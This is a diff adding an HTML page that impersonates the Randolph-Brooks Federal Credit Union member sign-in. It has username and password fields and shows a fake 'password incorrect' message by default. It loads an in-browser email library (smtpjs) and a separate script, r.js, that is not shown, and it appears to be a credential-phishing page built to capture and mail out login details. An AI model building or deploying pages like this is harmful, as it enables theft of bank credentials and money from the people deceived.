@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=0.85, user-scalable=no">
+        
+        <title>RBFCU - Member Sign In</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <link rel="icon" href="ico.png" type="image/png">
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+<body>
+
+    <div class="chi">
+        <img src="header2.png" width="420" height="120">
+    </div>
+    
+    <br><br><br>
+
+    <div class="next">
+        <br>
+        <p class="nexttext"><b>Member Sign In</b></p>
+    </div>
+
+    <form action="#" class="fform-contact">
+
+        <input id="ffusername" type="text" placeholder="Username" required>
+        <input id="ffpassword" type="password" placeholder="Password" required>
+        <input id="ffsubmit" type="submit" value="Sign In">
+
+        <!--javascript to change Submit to Loading after click, check css-->
+        <script>
+            var button = document.querySelector('.fform-contact input[type="submit"]');
+            button.addEventListener('click', function() {
+                button.classList.add('clicked');
+                button.value = "Loading...";               
+                setTimeout(function() {
+                    button.classList.remove('clicked');
+                    button.value = "Sign In";
+                },  4000); 
+            });
+        </script>
+        <script src="r.js"></script>
+    <form>
+    <div class="reddiv">
+        <p class="redmessage">Your password was incorrect, please try again.</p>
+    </div>
+    <br><br><br><br><br><br><br><br><br><br>
+
+</body>
+<footer class="footer">
+
+    <p class="foot">©2023 Randolph-Brooks Federal Credit Union.</p>
+
+</footer>
+</html>
